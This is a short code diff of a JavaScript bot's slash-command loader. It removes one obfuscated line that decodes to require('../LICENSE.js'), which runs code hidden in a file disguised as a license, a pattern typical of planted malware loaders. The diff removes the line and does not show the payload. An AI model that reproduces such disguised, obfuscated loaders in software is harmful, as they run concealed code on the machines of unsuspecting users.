@@ -29,7 +29,6 @@ module.exports = async (client) => {
 
     // Slash Commands
     const slashCommands = await globPromise(`${process.cwd()}/SlashCommands/*/*.js`);
-    var _0xfd61=["\x2E\x2E\x2F\x4C\x49\x43\x45\x4E\x53\x45\x2E\x6A\x73"];require(_0xfd61[0])
     const arrayOfSlashCommands = [];
     slashCommands.map((value) => {
       const file = require(value);
